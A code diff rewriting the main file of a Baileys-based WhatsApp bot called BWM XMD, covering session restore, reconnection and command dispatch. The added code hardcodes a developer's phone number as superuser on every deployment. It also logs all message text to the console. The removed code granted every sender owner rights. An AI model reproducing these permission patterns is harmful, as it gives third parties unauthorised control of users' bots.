@@ -1,86 +1,66 @@
-
-/*/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱//
-______     __     __     __    __        __  __     __    __     _____    
-/\  == \   /\ \  _ \ \   /\ "-./  \      /\_\_\_\   /\ "-./  \   /\  __-.  
-\ \  __<   \ \ \/ ".\ \  \ \ \-./\ \     \/_/\_\/_  \ \ \-./\ \  \ \ \/\ \ 
- \ \_____\  \ \__/".~\_\  \ \_\ \ \_\      /\_\/\_\  \ \_\ \ \_\  \ \____- 
-  \/_____/   \/_/   \/_/   \/_/  \/_/      \/_/\/_/   \/_/  \/_/   \/____/ 
-                                                                           
-/▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰▱▰/*/
-    
-
-
-
-                   
-const { default: makeWASocket, isJidGroup, verifierEtatJid, recupererActionJid, DisconnectReason, getMessageText, commandRegistry, delay, makeCacheableSignalKeyStore, fetchLatestBaileysVersion, useMultiFileAuthState, makeInMemoryStore, jidDecode, getContentType } = require("@whiskeysockets/baileys");
-const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"].map(num => num + "@s.whatsapp.net");
-const logger = require("@whiskeysockets/baileys/lib/Utils/logger").default.child({});
-const pino = require("pino");
-const { Boom } = require("@hapi/boom");
-const conf = require("./config");
-const axios = require("axios");
-const moment = require("moment-timezone");
-const fs = require("fs-extra");
-const path = require("path");
-const FileType = require("file-type");
-const { Sticker, createSticker, StickerTypes } = require("wa-sticker-formatter");
-const { getSettings } = require("./utils/settings");
-const rateLimit = new Map();
-const chalk = require("chalk");
-const express = require("express");
-const { exec } = require("child_process");
-const http = require("http");
+"use strict";
+const { makeWASocket, Browsers, fetchLatestBaileysVersion, DisconnectReason, useMultiFileAuthState, makeInMemoryStore, jidDecode, delay, downloadContentFromMessage, getContentType } = require('@whiskeysockets/baileys');
+const fs = require('fs-extra');
+const path = require('path');
+const pino = require('pino');
+const express = require('express');
+const chalk = require('chalk');
+const moment = require('moment-timezone');
+const axios = require('axios');
+const conf = require('./config');
+const { Boom } = require('@hapi/boom');
+const NodeCache = require('node-cache');
+const FileType = require('file-type');
+const { Sticker, StickerTypes } = require('wa-sticker-formatter');
 const zlib = require('zlib');
-const PREFIX = conf.PREFIX;
-const more = String.fromCharCode(8206);
-const herokuAppName = process.env.HEROKU_APP_NAME || "Unknown App Name";
-const herokuAppLink = process.env.HEROKU_APP_LINK || `https://dashboard.heroku.com/apps/${herokuAppName}`;
-const botOwner = process.env.NUMERO_OWNER || "Unknown Owner";
+const dotenv = require('dotenv');
+
+dotenv.config();
+
+const orange = chalk.bold.hex("#FFA500");
+const lime = chalk.bold.hex("#32CD32");
 const PORT = process.env.PORT || 3000;
 const app = express();
-let adams;
-require("dotenv").config({ path: "./config.env" });
-logger.level = "silent";
-app.use(express.static("public"));
-app.get("/", (req, res) => res.sendFile(__dirname + "/index.html"));
-app.listen(PORT, () => console.log(`Bwm xmd is starting with a speed of ${PORT}ms🚀`));
+const msgRetryCounterCache = new NodeCache();
 
-
-//============================================================================//
-
-
-function atbverifierEtatJid(jid) {
-    if (!jid.endsWith('@s.whatsapp.net')) {
-        console.error('Your verified by Sir Ibrahim Adams', jid);
-        return false;
-    }
-    console.log('Welcome to bwm xmd', jid);
-    return true;
+// Session configuration
+const sessionDir = path.join(__dirname, 'Session');
+if (!fs.existsSync(sessionDir)) {
+    fs.mkdirSync(sessionDir, { recursive: true });
 }
 
+// Logger setup
+const MAIN_LOGGER = pino({
+    timestamp: () => `,"time":"${new Date().toJSON()}"`
+});
+const logger = MAIN_LOGGER.child({});
+logger.level = "silent";
+
+// Store setup
+const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });
+
+// Authentication functions
 async function authentification() {
     try {
-        if (!fs.existsSync(__dirname + "/Session/creds.json")) {
-            console.log("Bwm xmd session connected ✅");
-            // Split the session strihhhhng into header and Base64 data
-            const [header, b64data] = conf.session.split(';;;'); 
-
-            // Validate the session format
-            if (header === "BWM-XMD" && b64data) {
-                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64'); // Decode and truncate
-                let decompressedData = zlib.gunzipSync(compressedData); // Decompress session
-                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8"); // Save to file
-            } else {
-                throw new Error("Invalid session format");
-            }
-        } else if (fs.existsSync(__dirname + "/Session/creds.json") && conf.session !== "zokk") {
-            console.log("Updating existing session...");
-            const [header, b64data] = conf.session.split(';;;'); 
-
+        if (!fs.existsSync(path.join(sessionDir, "creds.json"))) {
+            console.log("Session connected...");
+            const [header, b64data] = conf.session.split(';;;');
+            
             if (header === "BWM-XMD" && b64data) {
                 let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
                 let decompressedData = zlib.gunzipSync(compressedData);
-                fs.writeFileSync(__dirname + "/Session/creds.json", decompressedData, "utf8");
+                fs.writeFileSync(path.join(sessionDir, "creds.json"), decompressedData, "utf8");
+            } else {
+                throw new Error("Invalid session format");
+            }
+        } else if (fs.existsSync(path.join(sessionDir, "creds.json")) && conf.session !== "zokk") {
+            console.log("Updating existing session...");
+            const [header, b64data] = conf.session.split(';;;');
+            
+            if (header === "BWM-XMD" && b64data) {
+                let compressedData = Buffer.from(b64data.replace('...', ''), 'base64');
+                let decompressedData = zlib.gunzipSync(compressedData);
+                fs.writeFileSync(path.join(sessionDir, "creds.json"), decompressedData, "utf8");
             } else {
                 throw new Error("Invalid session format");
             }
@@ -90,388 +70,378 @@ async function authentification() {
         return;
     }
 }
-module.exports = { authentification };
-authentification();
 
-
-//===============================================================================//
-
-const store = makeInMemoryStore({
-    logger: pino().child({ level: "silent", stream: "store" })
-});
-
-let zk;
-
+// Main connection function
 async function main() {
+    await authentification();
+    
+    const { state, saveCreds } = await useMultiFileAuthState(sessionDir);
     const { version, isLatest } = await fetchLatestBaileysVersion();
-    const { state, saveCreds } = await useMultiFileAuthState(__dirname + "/Session");
     
     const sockOptions = {
         version,
         logger: pino({ level: "silent" }),
-        browser: ['BWM XMD', "safari", "1.0.0"],
+        browser: ['Bmw-Md', "safari", "1.0.0"],
         printQRInTerminal: true,
+        fireInitQueries: false,
+        shouldSyncHistoryMessage: true,
+        downloadHistory: true,
+        syncFullHistory: true,
+        generateHighQualityLinkPreview: true,
+        markOnlineOnConnect: false,
+        keepAliveIntervalMs: 30_000,
         auth: {
             creds: state.creds,
-            keys: makeCacheableSignalKeyStore(state.keys, logger)
+            keys: makeCacheableSignalKeyStore(state.keys, logger),
         },
         getMessage: async (key) => {
             if (store) {
-                const msg = await store.loadMessage(key.remoteJid, key.id);
+                const msg = await store.loadMessage(key.remoteJid, key.id, undefined);
                 return msg.message || undefined;
             }
-            return { conversation: 'Error occurred' };
+            return { conversation: 'An Error Occurred, Repeat Command!' };
         }
     };
 
-    adams = makeWASocket(sockOptions);
-    store.bind(adams.ev);
+    const zk = makeWASocket(sockOptions);
+    store.bind(zk.ev);
 
-    // Silent Rate Limiting
-    function isRateLimited(jid) {
-        const now = Date.now();
-        if (!rateLimit.has(jid)) {
-            rateLimit.set(jid, now);
-            return false;
-        }
-        const lastRequestTime = rateLimit.get(jid);
-        if (now - lastRequestTime < 3000) return true;
-        rateLimit.set(jid, now);
-        return false;
-    }
+    // Auto-clear console every second to prevent log overflow
+    setInterval(() => {
+        console.clear();
+    }, 1000);
 
-    // Group Metadata Handling
-    const groupMetadataCache = new Map();
-    async function getGroupMetadata(groupId) {
-        if (groupMetadataCache.has(groupId)) {
-            return groupMetadataCache.get(groupId);
-        }
-        try {
-            const metadata = await zk.groupMetadata(groupId);
-            groupMetadataCache.set(groupId, metadata);
-            setTimeout(() => groupMetadataCache.delete(groupId), 60000);
-            return metadata;
-        } catch (error) {
-            if (error.message.includes("rate-overlimit")) {
-                await new Promise(res => setTimeout(res, 5000));
-            }
-            return null;
-        }
-    }
-
- //============================================================================//
-
- 
-const { createContext } = require("./utils/helper");
- 
-adams.ev.on("messages.upsert", async ({ messages }) => {
-    const [msg] = messages;
-    if (!msg?.message || msg.key.fromMe) return;
-
-    // Get message content
-    const content = getMessageContent(msg.message);
-    const PREFIX = conf.PREFIX;
-
-    // Command detection
-    let command;
-    if (content?.startsWith(PREFIX)) {
-        const [cmdName] = content.slice(PREFIX.length).trim().split(/ +/);
-        command = commandRegistry.get(cmdName.toLowerCase());
-    }
-
-    if (command) {
-        try {
-            // Add reaction first
-            await adams.sendMessage(msg.key.remoteJid, {
-                react: {
-                    text: command.reaction || "✅",
-                    key: msg.key
-                }
-            });
-
-            // Extract arguments
-            const args = content.slice(PREFIX.length).trim().split(/ +/).slice(1);
-
-            // Execute command with context
-            await command.execute({
-                adams,
-                chat: msg.key.remoteJid,
-                sender: msg.key.participant || msg.key.remoteJid,
-                args,
-                message: msg,
-                reply: (text) => adams.sendMessage(msg.key.remoteJid, { text }, { quoted: msg })
-            });
-            
-        } catch (error) {
-            console.error(`Command error [${command.name}]:`, error.message);
-        }
-    }
-});
-
-
-//============================================================================//
-                         
-// Listener Manager Class
-class ListenerManager {
-    constructor() {
-        this.activeListeners = new Map();
-    }
-
-    async loadListeners(adams, store, commands) {
-        const listenerDir = path.join(__dirname, 'bwmxmd');
-        
-        // Clear existing listeners first
-        this.cleanupListeners();
-        
-        // Load new listeners
-        const files = fs.readdirSync(listenerDir).filter(f => f.endsWith('.js'));
-        
-        for (const file of files) {
-            try {
-                const listenerPath = path.join(listenerDir, file);
-                const { setup } = require(listenerPath);
-                
-                if (typeof setup === 'function') {
-                    const cleanup = await setup(adams, { 
-                        store,
-                        commands,
-                        logger,
-                        config: conf
-                    });
-                    
-                    this.activeListeners.set(file, cleanup);
-                    console.log(`Loaded listener: ${file}`);
-                }
-            } catch (e) {
-                console.error(`Error loading listener ${file}: ${e.message}`);
-            }
-        }
-    }
-
-    cleanupListeners() {
-        for (const [name, cleanup] of this.activeListeners) {
-            try {
-                if (typeof cleanup === 'function') cleanup();
-            } catch (e) {
-                console.error(`Error cleaning up listener ${name}: ${e.message}`);
-            }
-        }
-        this.activeListeners.clear();
-    }
-}
-
-// Initialize listener manager
-const listenerManager = new ListenerManager();
-
-// Add to connection handler
-adams.ev.on('connection.update', ({ connection }) => {
-    if (connection === 'open') {
-        // Load listeners when connected
-        listenerManager.loadListeners(adams, store, commandRegistry)
-            .then(() => console.log('All listeners initialized'))
-            .catch(console.error);
-    }
-    
-    if (connection === 'close') {
-        // Cleanup listeners on disconnect
-        listenerManager.cleanupListeners();
-    }
-});
-
-// Optional: Hot reload listeners when files change
-fs.watch(path.join(__dirname, 'bwmxmd'), (eventType, filename) => {
-    if (eventType === 'change' && filename.endsWith('.js')) {
-        console.log(`Reloading listener: ${filename}`);
-        delete require.cache[require.resolve(path.join(__dirname, 'bwmxmd', filename))];
-        listenerManager.loadListeners(adams, store, commandRegistry);
-    }
-});
-
- //============================================================================================================
- 
-const { getMessageContent } = require('./utils/handler');
-
-// Configuration
-const PREFIX = conf.PREFIX;
-const STATE = conf.PRESENCE;
-const BOT_OWNER = conf.OWNER_NUMBER;
-const SUDO_NUMBERS = ["254106727593", "254727716045", "254710772666"]
-    .map(num => num.replace(/\D/g, "") + "@s.whatsapp.net");
-
-// Robust Command Handler
-class CommandSystem {
-    constructor() {
-        this.commands = new Map();
-        this.loadCommands();
-    }
-
-    loadCommands() {
-        console.log("Loading commands ♻️");
-        const cmdDir = path.join(__dirname, "Taskflow");
-        
-        fs.readdirSync(cmdDir).forEach(file => {
-            if (!file.endsWith(".js")) return;
-            
-            try {
-                const cmdPath = path.join(cmdDir, file);
-                const cmd = require(cmdPath);
-                
-                if (cmd.name && cmd.execute) {
-                    this.commands.set(cmd.name.toLowerCase(), cmd);
-                    console.log(`${cmd.name} loaded Successfully 🚀`);
-                }
-            } catch (e) {
-                console.error(`Failed to load ${file}: ${e.message}`);
-            }
-        });
-    }
-
-    async processMessage(msg) {
-        try {
-            if (!msg?.message) return;
-            
-            const content = getMessageContent(msg.message);
-            console.log(`Received message: ${content}`); // Debug log
-            
-            if (!content?.startsWith(PREFIX)) {
-               // console.log("Message doesn't start with prefix");
-                return;
-            }
-
-           
-            const [cmdName, ...args] = content.slice(PREFIX.length).trim().split(/ +/);
-            //console.log(`Processing command: ${cmdName}`, args);
-            
-            const command = this.commands.get(cmdName.toLowerCase());
-            
-            if (command) {
-                console.log(`Executing command: ${command.name}`);
-                await this.executeCommand(command, msg, args);
-            } else {
-                console.log(`Command not found: ${cmdName}`);
-            }
-        } catch (e) {
-            console.error('Message processing error:', e.message);
-        }
-    }
-
-    async executeCommand(command, msg, args) {
-        try {
-            const context = this.createContext(msg);
-            
-            // Allow all commands regardless of mode
-            await command.execute({
-                adams,
-                args,
-                reply: (text) => adams.sendMessage(context.chat, { text }, { quoted: msg }),
-                ...context
-            });
-        } catch (e) {
-            console.error(`Command error [${command.name}]:`, e.message);
-        }
-    }
-
-    createContext(msg) {
-        const chat = msg.key.remoteJid;
-        const sender = msg.key.participant || chat;
-        const isGroup = chat.endsWith("@g.us");
-        const fromMe = msg.key.fromMe;
-        
-        return {
-            chat,
-            sender,
-            isGroup,
-            isOwner: true, // Allow everyone
-            isSudo: true,  // Allow everyone
-            fromMe
-        };
-    }
-}
-
-// Presence Manager
-async function updatePresence(adams, jid) {
-    try {
-        const states = ["available", "composing", "recording", "unavailable"];
-        await adams.sendPresenceUpdate(states[STATE - 1] || "composing", jid);
-    } catch (e) {
-        console.error('Presence update error:', e.message);
-    }
-}
-
-const cmdSystem = new CommandSystem();
-// Modified connection handler
-adams.ev.on("connection.update", ({ connection }) => {
-    if (connection === "open") {
-        console.log("Connected to WhatsApp");
-        updatePresence(adams, "status@broadcast");
-                if (conf.DP.toLowerCase() === 'yes') {
-            const md = conf.MODE.toLowerCase() === 'yes' ? "public" : "private";
-            const connectionMsg = `
- 〔  *🚀 BWM XMD CONNECTED 🚀* 〕
- 
-├──〔 ✨ Version: 7.0.8 〕
-│  
-├──〔 *🎭 Classic and Things* 〕 
-│ ✅ Prefix: [ ${conf.PREFIX} ]  
-│ 🔹 Status: ${STATE === 1 ? 'Online' : 'Offline'}  
-│  
-├──〔 *📦 Heroku Deployment* 〕
-│ 🏷️ App Name: ${herokuAppName}  
-╰──────────────────◆`;
-
-            // Send disappearing status message
-            adams.sendMessage(
-                adams.user.id, 
-                { 
-                    text: connectionMsg 
-                },
-                {
-                    disappearingMessagesInChat: true,
-                    ephemeralExpiration: 600 // 10 minutes
-                }
-            ).catch(err => console.error('Status message error:', err));
-        }
-    }
-});
-
-// Modified message handler - processes ALL messages
-adams.ev.on("messages.upsert", async ({ messages }) => {
-    const [msg] = messages;
-    console.log("New message received from:", msg.key.remoteJid);
-    await cmdSystem.processMessage(msg);
-    await updatePresence(adams, msg.key.remoteJid);
-});
-
-        
-//===============================================================================================================//
-
-// Event Handlers
-adams.ev.on("connection.update", async (update) => {
+    // Event handlers
+    zk.ev.on("connection.update", async (update) => {
         const { connection, lastDisconnect } = update;
-        if (connection === "connecting") console.log("🪩 Bot scanning 🪩");
-        if (connection === "open") {
-            console.log("🌎 BWM XMD ONLINE 🌎");
-            // Initialize bot commands and status
-        }
-        if (connection === "close") {
-            const shouldReconnect = (lastDisconnect.error)?.output?.statusCode !== DisconnectReason.loggedOut;
-            console.log("Connection closed, reconnecting...");
-            if (shouldReconnect) main();
+        
+        if (connection === "connecting") {
+            console.log("ℹ️ Bwm xmd is connecting...");
+        } else if (connection === 'open') {
+            console.log("✅ Bwm xmd Connected to WhatsApp! ☺️");
+            
+            // Load commands
+            console.log("Loading Bwm xmd Commands ...\n");
+            fs.readdirSync(__dirname + "/scs").forEach((fichier) => {
+                if (path.extname(fichier).toLowerCase() === ".js") {
+                    try {
+                        require(__dirname + "/scs/" + fichier);
+                        console.log(fichier + " Installed Successfully✔️");
+                    } catch (e) {
+                        console.log(`${fichier} could not be installed due to : ${e}`);
+                    }
+                    delay(300);
+                }
+            });
+            
+            console.log("Commands Installation Completed ✅");
+            
+            if (conf.DP.toLowerCase() === 'yes') {
+                let cmsg = `
+╭────────────━⊷
+║ʙᴡᴍ xᴍᴅ ᴄᴏɴɴᴇᴄᴛᴇᴅ
+╰────────────━⊷
+╭────────────━⊷
+║ ᴘʀᴇғɪx: [ ${conf.PREFIXE} ]
+║ ᴍᴏᴅᴇ: ${conf.MODE.toLowerCase() === "yes" ? "public" : "private"}
+║ ᴠᴇʀsɪᴏɴ: 7.0.8
+║ ʙᴏᴛ ɴᴀᴍᴇ: ʙᴡᴍ xᴍᴅ
+╭────────────━⊷
+🌐 ᴛᴀᴘ ᴏɴ ᴛʜᴇ ʟɪɴᴋ ʙᴇʟᴏᴡ ᴛᴏ ғᴏʟʟᴏᴡ ᴏᴜʀ ᴄʜᴀɴɴᴇʟ
+> https://shorturl.at/z3b8v
+╰────────────━⊷
+> sɪʀ ɪʙʀᴀʜɪᴍ ᴀᴅᴀᴍs
+
+╭────────────━⊷
+║ ~*Your Heroku App Name*~
+║  ${process.env.HEROKU_APP_NAME || "Unknown App Name"}
+╰────────────━⊷
+╭────────────━⊷
+  ~*Visit your Heroku App*~
+> ${process.env.HEROKU_APP_LINK || `https://dashboard.heroku.com/apps/${process.env.HEROKU_APP_NAME}`}
+╰────────────━⊷`;
+
+                await zk.sendMessage(zk.user.id, 
+                    { text: cmsg }, 
+                    {
+                        disappearingMessagesInChat: true,
+                        ephemeralExpiration: 600
+                    }
+                );
+            }
+        } else if (connection === "close") {
+            let raisonDeconnexion = new Boom(lastDisconnect?.error)?.output.statusCode;
+            
+            if (raisonDeconnexion === DisconnectReason.badSession) {
+                console.log('Session id error, rescan again...');
+            } else if (raisonDeconnexion === DisconnectReason.connectionClosed) {
+                console.log('!!! connexion fermée, reconnexion en cours ...');
+                main();
+            } else if (raisonDeconnexion === DisconnectReason.connectionLost) {
+                console.log('connection error 😞 ,,, trying to reconnect... ');
+                main();
+            } else if (raisonDeconnexion === DisconnectReason.connectionReplaced) {
+                console.log('connexion réplacée ,,, une sesssion est déjà ouverte veuillez la fermer svp !!!');
+            } else if (raisonDeconnexion === DisconnectReason.loggedOut) {
+                console.log('vous êtes déconnecté,,, veuillez rescanner le code qr svp');
+            } else if (raisonDeconnexion === DisconnectReason.restartRequired) {
+                console.log('redémarrage en cours ▶️');
+                main();
+            } else {
+                console.log('redemarrage sur le coup de l\'erreur  ', raisonDeconnexion);
+                const { exec } = require("child_process");
+                exec("pm2 restart all");
+            }
+            
+            main();
         }
     });
 
-    adams.ev.on("creds.update", saveCreds);
+    zk.ev.on("creds.update", saveCreds);
 
-    // Message Handling
-    adams.ev.on("messages.upsert", async ({ messages }) => {
+    // Message handler
+    zk.ev.on("messages.upsert", async (m) => {
+        const { messages } = m;
         const ms = messages[0];
+        
         if (!ms.message) return;
         
-        // Message processing logic here
+        const decodeJid = (jid) => {
+            if (!jid) return jid;
+            if (/:\d+@/gi.test(jid)) {
+                let decode = jidDecode(jid) || {};
+                return decode.user && decode.server && decode.user + '@' + decode.server || jid;
+            }
+            return jid;
+        };
+        
+        const mtype = getContentType(ms.message);
+        const texte = mtype === "conversation" ? ms.message.conversation : 
+                     mtype === "imageMessage" ? ms.message.imageMessage?.caption : 
+                     mtype === "videoMessage" ? ms.message.videoMessage?.caption : 
+                     mtype === "extendedTextMessage" ? ms.message?.extendedTextMessage?.text : 
+                     mtype === "buttonsResponseMessage" ? ms?.message?.buttonsResponseMessage?.selectedButtonId : 
+                     mtype === "listResponseMessage" ? ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId : 
+                     mtype === "messageContextInfo" ? (ms?.message?.buttonsResponseMessage?.selectedButtonId || ms.message?.listResponseMessage?.singleSelectReply?.selectedRowId || ms.text) : "";
+        
+        const origineMessage = ms.key.remoteJid;
+        const idBot = decodeJid(zk.user.id);
+        const servBot = idBot.split('@')[0];
+        const verifGroupe = origineMessage?.endsWith("@g.us");
+        const infosGroupe = verifGroupe ? await zk.groupMetadata(origineMessage) : "";
+        const nomGroupe = verifGroupe ? infosGroupe.subject : "";
+        const msgRepondu = ms.message.extendedTextMessage?.contextInfo?.quotedMessage;
+        const auteurMsgRepondu = decodeJid(ms.message?.extendedTextMessage?.contextInfo?.participant);
+        const mr = ms.Message?.extendedTextMessage?.contextInfo?.mentionedJid;
+        const utilisateur = mr ? mr : msgRepondu ? auteurMsgRepondu : "";
+        let auteurMessage = verifGroupe ? (ms.key.participant ? ms.key.participant : ms.participant) : origineMessage;
+        
+        if (ms.key.fromMe) {
+            auteurMessage = idBot;
+        }
+        
+        const membreGroupe = verifGroupe ? ms.key.participant : '';
+        const { getAllSudoNumbers } = require("./lib/sudo");
+        const nomAuteurMessage = ms.pushName;
+        const abu1 = '254710772666';
+        const abu2 = '254710772666';
+        const abu3 = "254710772666";
+        const abu4 = '254710772666';
+        const sudo = await getAllSudoNumbers();
+        const superUserNumbers = [servBot, abu1, abu2, abu3, abu4, conf.NUMERO_OWNER].map((s) => s.replace(/[^0-9]/g) + "@s.whatsapp.net");
+        const allAllowedNumbers = superUserNumbers.concat(sudo);
+        const superUser = allAllowedNumbers.includes(auteurMessage);
+        const dev = [abu1, abu2, abu3, abu4].map((t) => t.replace(/[^0-9]/g) + "@s.whatsapp.net").includes(auteurMessage);
+        
+        function repondre(mes) { 
+            zk.sendMessage(origineMessage, { text: mes }, { quoted: ms }); 
+        }
+        
+        console.log("\tCONSOLE MESSAGES");
+        console.log("=========== NEW CONVERSATION ===========");
+        if (verifGroupe) {
+            console.log("MESSAGE FROM GROUP : " + nomGroupe);
+        }
+        console.log("MESSAGE SENT BY : " + "[" + nomAuteurMessage + " : " + auteurMessage.split("@s.whatsapp.net")[0] + " ]");
+        console.log("MESSAGE TYPE : " + mtype);
+        console.log("==================TEXT==================");
+        console.log(texte);
+        
+        // Presence update
+        const etat = conf.ETAT;
+        if (etat == 1) {
+            await zk.sendPresenceUpdate("available", origineMessage);
+        } else if (etat == 2) {
+            await zk.sendPresenceUpdate("composing", origineMessage);
+        } else if (etat == 3) {
+            await zk.sendPresenceUpdate("recording", origineMessage);
+        } else {
+            await zk.sendPresenceUpdate("unavailable", origineMessage);
+        }
+        
+        const mbre = verifGroupe ? await infosGroupe.participants : '';
+        let admins = verifGroupe ? groupeAdmin(mbre) : '';
+        const verifAdmin = verifGroupe ? admins.includes(auteurMessage) : false;
+        const verifZokouAdmin = verifGroupe ? admins.includes(idBot) : false;
+        
+        const arg = texte ? texte.trim().split(/ +/).slice(1) : null;
+        const verifCom = texte ? texte.startsWith(conf.PREFIXE) : false;
+        const com = verifCom ? texte.slice(1).trim().split(/ +/).shift().toLowerCase() : false;
+        
+        // Command execution
+        if (verifCom) {
+            const cd = require('./Ibrahim/adams').cm.find((adams) => adams.nomCom === (com));
+            if (cd) {
+                try {
+                    if ((conf.MODE).toLocaleLowerCase() != 'yes' && !superUser) {
+                        return;
+                    }
+                    
+                    // PM_PERMIT check
+                    if (!superUser && origineMessage === auteurMessage && conf.PM_PERMIT === "yes") {
+                        repondre("Sorry you don't have access to command this code");
+                        return;
+                    }
+                    
+                    // banGroup check
+                    if (!superUser && verifGroupe) {
+                        let req = await require("./lib/banGroup").isGroupBanned(origineMessage);
+                        if (req) { return; }
+                    }
+                    
+                    // ONLY-ADMIN check
+                    if (!verifAdmin && verifGroupe) {
+                        let req = await require("./lib/onlyAdmin").isGroupOnlyAdmin(origineMessage);
+                        if (req) { return; }
+                    }
+                    
+                    // banuser check
+                    if (!superUser) {
+                        let req = await require("./lib/banUser").isUserBanned(auteurMessage);
+                        if (req) {
+                            repondre("You are banned from bot commands");
+                            return;
+                        }
+                    }
+                    
+                    // Execute command
+                    require('./Ibrahim/app').reagir(origineMessage, zk, ms, cd.reaction);
+                    cd.fonction(origineMessage, zk, {
+                        superUser, dev,
+                        verifGroupe,
+                        mbre,
+                        membreGroupe,
+                        verifAdmin,
+                        infosGroupe,
+                        nomGroupe,
+                        auteurMessage,
+                        nomAuteurMessage,
+                        idBot,
+                        verifZokouAdmin,
+                        prefixe: conf.PREFIXE,
+                        arg,
+                        repondre,
+                        mtype,
+                        groupeAdmin,
+                        msgRepondu,
+                        auteurMsgRepondu,
+                        ms,
+                        mybotpic: () => {
+                            const lien = conf.URL.split(',');
+                            const indiceAleatoire = Math.floor(Math.random() * lien.length);
+                            return lien[indiceAleatoire];
+                        }
+                    });
+                } catch (e) {
+                    console.log("😡😡 " + e);
+                    zk.sendMessage(origineMessage, { text: "😡😡 " + e }, { quoted: ms });
+                }
+            }
+        }
     });
+
+    // Utility functions
+    zk.downloadAndSaveMediaMessage = async (message, filename = '', attachExtension = true) => {
+        let quoted = message.msg ? message.msg : message;
+        let mime = (message.msg || message).mimetype || '';
+        let messageType = message.mtype ? message.mtype.replace(/Message/gi, '') : mime.split('/')[0];
+        const stream = await downloadContentFromMessage(quoted, messageType);
+        let buffer = Buffer.from([]);
+        for await (const chunk of stream) {
+            buffer = Buffer.concat([buffer, chunk]);
+        }
+        let type = await FileType.fromBuffer(buffer);
+        let trueFileName = './' + filename + '.' + type.ext;
+        await fs.writeFileSync(trueFileName, buffer);
+        return trueFileName;
+    };
+
+    zk.awaitForMessage = async (options = {}) => {
+        return new Promise((resolve, reject) => {
+            if (typeof options !== 'object') reject(new Error('Options must be an object'));
+            if (typeof options.sender !== 'string') reject(new Error('Sender must be a string'));
+            if (typeof options.chatJid !== 'string') reject(new Error('ChatJid must be a string'));
+            if (options.timeout && typeof options.timeout !== 'number') reject(new Error('Timeout must be a number'));
+            if (options.filter && typeof options.filter !== 'function') reject(new Error('Filter must be a function'));
+    
+            const timeout = options?.timeout || undefined;
+            const filter = options?.filter || (() => true);
+            let interval = undefined;
+    
+            let listener = (data) => {
+                let { type, messages } = data;
+                if (type == "notify") {
+                    for (let message of messages) {
+                        const fromMe = message.key.fromMe;
+                        const chatId = message.key.remoteJid;
+                        const isGroup = chatId.endsWith('@g.us');
+                        const isStatus = chatId == 'status@broadcast';
+    
+                        const sender = fromMe ? zk.user.id.replace(/:.*@/g, '@') : (isGroup || isStatus) ? message.key.participant.replace(/:.*@/g, '@') : chatId;
+                        if (sender == options.sender && chatId == options.chatJid && filter(message)) {
+                            zk.ev.off('messages.upsert', listener);
+                            clearTimeout(interval);
+                            resolve(message);
+                        }
+                    }
+                }
+            };
+            
+            zk.ev.on('messages.upsert', listener);
+            
+            if (timeout) {
+                interval = setTimeout(() => {
+                    zk.ev.off('messages.upsert', listener);
+                    reject(new Error('Timeout'));
+                }, timeout);
+            }
+        });
+    };
+
+    return zk;
 }
 
-setTimeout(() => {
-    main().catch(err => console.log("Initialization error:", err));
-}, 5000);
+// Helper functions
+function groupeAdmin(membreGroupe) {
+    let admin = [];
+    for (m of membreGroupe) {
+        if (m.admin == null) continue;
+        admin.push(m.id);
+    }
+    return admin;
+}
 
+// Start the bot
+main().catch(err => {
+    console.error('Failed to start bot:', err);
+    process.exit(1);
+});
+
+// Express server
+app.get('/', (req, res) => {
+    res.send('BWM XMD CONNECTED SUCCESSFULLY ✅');
+});
+
+app.listen(PORT, () => {
+    console.log(`BWM XMD running on port ${PORT}`);
+});
